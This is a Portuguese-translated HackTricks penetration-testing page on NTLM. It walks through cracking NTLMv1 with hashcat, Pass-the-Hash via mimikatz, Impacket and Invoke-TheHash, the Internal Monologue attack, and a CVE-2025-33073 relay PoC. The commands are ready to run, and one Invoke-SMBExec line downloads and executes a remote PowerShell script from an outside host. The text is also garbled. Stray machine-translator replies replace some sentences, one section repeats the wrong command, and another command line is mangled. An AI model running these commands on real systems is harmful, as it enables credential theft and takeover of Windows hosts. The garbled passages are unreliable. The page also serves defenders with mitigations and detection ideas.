# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informações básicas

Em ambientes onde o **Windows XP e Server 2003** estão em operação, hashes LM (Lan Manager) são utilizados, embora seja amplamente reconhecido que eles podem ser facilmente comprometidos. Um hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica um cenário em que o LM não é utilizado, representando o hash de uma string vazia.

Por padrão, o protocolo de autenticação **Kerberos** é o método principal utilizado. O NTLM (NT LAN Manager) é utilizado em circunstâncias específicas: ausência do Active Directory, inexistência do domínio, falha do Kerberos devido a uma configuração inadequada ou quando são realizadas conexões usando um endereço IP em vez de um hostname válido.

A presença do cabeçalho **"NTLMSSP"** nos pacotes de rede indica um processo de autenticação NTLM.

O suporte aos protocolos de autenticação - LM, NTLMv1 e NTLMv2 - é fornecido por uma DLL específica localizada em `%windir%\Windows\System32\msv1\_0.dll`.

**Pontos principais**:

- Hashes LM são vulneráveis, e um hash LM vazio (`AAD3B435B51404EEAAD3B435B51404EE`) indica que ele não é utilizado.
- Kerberos é o método de autenticação padrão, enquanto o NTLM é utilizado apenas em determinadas condições.
- Pacotes de autenticação NTLM podem ser identificados pelo cabeçalho "NTLMSSP".
- Os protocolos LM, NTLMv1 e NTLMv2 são compatíveis com o arquivo de sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

Você pode verificar e configurar qual protocolo será utilizado:

### GUI

Execute _secpol.msc_ -> Políticas locais -> Opções de segurança -> Segurança de rede: nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5).

![LM, NTLMv1 e NTLMv2 - GUI: Execute secpol.msc - Políticas locais - Opções de segurança - Segurança de rede: nível de autenticação do LAN Manager. Existem 6 níveis (de 0 a 5)](<../../images/image (919).png>)

### Registry

Isso definirá o nível 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valores possíveis:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticação de domínio NTLM

1. O **usuário** introduz suas **credenciais**
2. A máquina cliente **envia uma solicitação de autenticação**, enviando o **nome do domínio** e o **nome de usuário**
3. O **servidor** envia o **desafio**
4. O **cliente criptografa** o **desafio** usando o hash da senha como chave e o envia como resposta
5. O **servidor envia** ao **controlador de domínio** o **nome do domínio, o nome de usuário, o desafio e a resposta**. Se não houver um Active Directory configurado ou se o nome do domínio for o nome do servidor, as credenciais serão **verificadas localmente**.
6. O **controlador de domínio verifica se tudo está correto** e envia as informações ao servidor

O **servidor** e o **Controlador de Domínio** conseguem criar um **Secure Channel** por meio do servidor **Netlogon**, pois o Controlador de Domínio conhece a senha do servidor (ela está dentro do banco de dados **NTDS.DIT**).

### Esquema de autenticação NTLM local

A autenticação é igual à mencionada **anteriormente, mas** o **servidor** conhece o **hash do usuário** que tenta se autenticar dentro do arquivo **SAM**. Portanto, em vez de consultar o Controlador de Domínio, o **servidor verificará por conta própria** se o usuário pode se autenticar.

### Desafio NTLMv1

O **tamanho do desafio é de 8 bytes** e a **resposta** tem **24 bytes**.

O **hash NT (16 bytes)** é dividido em **3 partes de 7 bytes cada** (7B + 7B + (2B+0x00\*5)): a **última parte é preenchida com zeros**. Em seguida, o **desafio** é **cifrado separadamente** com cada parte e os **bytes cifrados resultantes** são **concatenados**. Total: 8B + 8B + 8B = 24 Bytes.

**Problemas**:

- Falta de **aleatoriedade**
- As 3 partes podem ser **atacadas separadamente** para encontrar o hash NT
- **DES pode ser quebrado**
- A 3ª chave é sempre composta por **5 zeros**.
- Dado o **mesmo desafio**, a **resposta** será a **mesma**. Portanto, você pode fornecer à vítima, como **desafio**, a string "**1122334455667788**" e atacar a resposta usando **rainbow tables** pré-computadas.

### Ataque NTLMv1

Atualmente, está se tornando menos comum encontrar ambientes com Unconstrained Delegation configurado, mas isso não significa que você não possa **abusar de um serviço Print Spooler** configurado.

Você poderia abusar de algumas credenciais/sessões que já possui no AD para **solicitar que a impressora se autentique** em algum **host sob seu controle**. Em seguida, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se ela tiver sido realizada usando **NTLMv1**, poderá **quebrá-la**.\
Se estiver usando `responder`, você pode tentar **usar a flag `--lm`** para tentar **fazer downgrade** da **autenticação**.\
_Observe que, para esta técnica, a autenticação deve ser realizada usando NTLMv1 (NTLMv2 não é válido)._

Lembre-se de que a impressora usará a conta do computador durante a autenticação, e as contas de computador usam **senhas longas e aleatórias** que você **provavelmente não conseguirá quebrar** usando **dicionários** comuns. Porém, a autenticação **NTLMv1** **usa DES** ([mais informações aqui](#ntlmv1-challenge)); portanto, usando alguns serviços especialmente dedicados a quebrar DES, você poderá quebrá-la (por exemplo, você pode usar [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com)).

### Ataque NTLMv1 com hashcat

O NTLMv1 também pode ser quebrado com o NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), que formata as mensagens NTLMv1 de uma maneira que pode ser quebrada com o hashcat.<sup>[[1]](#references)</sup>

O comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Envie o conteúdo que deseja traduzir.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Execute o hashcat (a distribuição é melhor por meio de uma ferramenta como o hashtopolis), pois isso levará vários dias caso contrário.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Neste caso, sabemos que a senha é password, então vamos trapacear para fins de demonstração:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Agora precisamos usar os hashcat-utilities para converter as chaves DES quebradas em partes do hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Envie o conteúdo da última parte para tradução.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text or files you want me to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

O **challenge length is 8 bytes** e **2 responses are sent**: Uma tem **24 bytes** de comprimento e o tamanho da **outra** é **variável**.

**The first response** é criada cifrando usando **HMAC_MD5** a **string** composta pelo **client and the domain** e usando como **key** o **hash MD4** do **NT hash**. Então, o **result** será usado como **key** para cifrar usando **HMAC_MD5** o **challenge**. A isso, será adicionado um **client challenge of 8 bytes**. Total: 24 B.

**The second response** é criada usando **several values** (um novo client challenge, um **timestamp** para evitar **replay attacks**...)

Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, pode seguir este guia para obter o domínio, o username, o challenge e a response e tentar quebrar a password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Once you have the hash of the victim**, você pode usá-lo para **impersonate** a vítima.\
Você precisa usar uma **tool** que **perform** a **NTLM authentication using** esse **hash**, **or** pode criar uma nova **sessionlogon** e **inject** esse **hash** dentro do **LSASS**, para que, quando qualquer **NTLM authentication is performed**, esse **hash will be used.** A última opção é o que o mimikatz faz.

**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Isso iniciará um processo que pertencerá aos usuários que executaram o mimikatz, mas, internamente, no LSASS, as credenciais salvas serão as que estão dentro dos parâmetros do mimikatz. Assim, você poderá acessar recursos de rede como se fosse esse usuário (semelhante ao truque `runas /netonly`, mas sem precisar saber a senha em texto simples).

### Pass-the-Hash from linux

Você pode obter execução de código em máquinas Windows usando Pass-the-Hash a partir do Linux.\
[**Acesse aqui para saber como fazer isso.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Ferramentas compiladas do Impacket para Windows

Você pode baixar[ os binários do impacket para Windows aqui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Neste caso, você precisa especificar um comando; cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Existem vários outros binários do Impacket...

### Invoke-TheHash

Você pode obter os scripts do powershell aqui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta função é uma **combinação de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **SMBExec** ou **WMIExec**, mas **não** fornecer nenhum parâmetro _**Command**_, ela apenas **verificará** se você tem **permissões suficientes**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Precisa ser executado como administrador**

Esta ferramenta fará a mesma coisa que o mimikatz (modificar a memória do LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Execução remota manual do Windows com nome de usuário e senha


{{#ref}}
../lateral-movement/
{{#endref}}

## Extraindo credenciais de um Host Windows

**Para obter mais informações sobre** [**como obter credenciais de um host Windows, leia esta página**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Ataque Internal Monologue

O Internal Monologue Attack é uma técnica furtiva de extração de credenciais que permite a um atacante recuperar hashes NTLM da máquina da vítima **sem interagir diretamente com o processo LSASS**. Diferentemente do Mimikatz, que lê hashes diretamente da memória e é frequentemente bloqueado por soluções de segurança de endpoint ou pelo Credential Guard, esse ataque utiliza **chamadas locais ao pacote de autenticação NTLM (MSV1_0) por meio da Security Support Provider Interface (SSPI)**. Primeiro, o atacante **reduz as configurações do NTLM** (por exemplo, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para garantir que o NetNTLMv1 seja permitido. Em seguida, ele personifica tokens de usuário existentes obtidos de processos em execução e aciona a autenticação NTLM localmente para gerar respostas NetNTLMv1 usando um challenge conhecido.<sup>[[4]](#references)</sup>

Após capturar essas respostas NetNTLMv1, o atacante pode recuperar rapidamente os hashes NTLM originais usando **rainbow tables pré-computadas**, permitindo novos ataques de Pass-the-Hash para lateral movement. O Internal Monologue Attack permanece furtivo porque não gera tráfego de rede, não injeta código nem aciona dumps diretos de memória, tornando sua detecção mais difícil para os defensores em comparação com métodos tradicionais, como o Mimikatz.

Se o NetNTLMv1 não for aceito — devido à aplicação de políticas de segurança — o atacante poderá não conseguir recuperar uma resposta NetNTLMv1.

Para lidar com esse caso, a ferramenta Internal Monologue foi atualizada: ela adquire dinamicamente um token de servidor usando `AcceptSecurityContext()` para ainda **capturar respostas NetNTLMv2** caso o NetNTLMv1 falhe. Embora o NetNTLMv2 seja muito mais difícil de crackear, ele ainda abre caminho para ataques de relay ou brute-force offline em casos limitados.

O PoC pode ser encontrado em **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay e Responder

**Leia aqui um guia mais detalhado sobre como executar esses ataques:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analisar challenges NTLM a partir de uma captura de rede

**Você pode usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* de NTLM e Kerberos via SPNs serializados (CVE-2025-33073)

O Windows contém várias mitigações que tentam impedir ataques de *reflection*, nos quais uma autenticação NTLM (ou Kerberos) originada de um host é retransmitida de volta para o **mesmo** host para obter privilégios SYSTEM.

A Microsoft interrompeu a maioria das chains públicas com o MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e patches posteriores. No entanto, a **CVE-2025-33073** mostra que as proteções ainda podem ser contornadas explorando a forma como o **cliente SMB trunca os Service Principal Names (SPNs)** que contêm target-info *marshalled* (serializado).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR do bug
1. Um atacante registra um **registro DNS A** cujo label codifica um SPN marshalled — por exemplo:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. A vítima é induzida a se autenticar nesse hostname (PetitPotam, DFSCoerce etc.).
3. Quando o cliente SMB passa a string de destino `cifs/srv11UWhRCAAAAA…` para `lsasrv!LsapCheckMarshalledTargetInfo`, a chamada a `CredUnmarshalTargetInfo` **remove** o blob serializado, deixando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ou o equivalente do Kerberos) passa a considerar o destino como *localhost* porque a parte curta do host corresponde ao nome do computador (`SRV1`).
5. Consequentemente, o servidor define `NTLMSSP_NEGOTIATE_LOCAL_CALL` e injeta o **access-token SYSTEM do LSASS** no contexto (no Kerberos, uma subsession key marcada como SYSTEM é criada).
6. Retransmitir essa autenticação com `ntlmrelayx.py` **ou** `krbrelayx.py` concede direitos SYSTEM completos no mesmo host.<sup>[[5]](#references)</sup>

### PoC rápida
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch e Mitigações
* O patch KB para **CVE-2025-33073** adiciona uma verificação em `mrxsmb.sys::SmbCeCreateSrvCall` que bloqueia qualquer conexão SMB cujo destino contenha informações marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Aplicar **SMB signing** para impedir reflection mesmo em hosts sem patch.
* Monitorar registros DNS semelhantes a `*<base64>...*` e bloquear vetores de coerção (PetitPotam, DFSCoerce, AuthIP...).

### Ideias de detecção
* Capturas de rede com `NTLMSSP_NEGOTIATE_LOCAL_CALL` em que o IP do cliente ≠ IP do servidor.
* Kerberos AP-REQ contendo uma chave de subsessão e um principal de cliente igual ao hostname.
* Logons SYSTEM dos Eventos do Windows 4624/4648 seguidos imediatamente por gravações SMB remotas do mesmo host.<sup>[[5]](#references)</sup>

Para a variante de reflection local de **março de 2026**, que explora **SMB arbitrary ports** e **TCP connection reuse** para alcançar `NT AUTHORITY\SYSTEM`, consulte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Referências
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking de um Hash NTLMv2](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – Utilitários PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Recuperando Hashes NTLM sem tocar no LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection está morto, longa vida ao NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
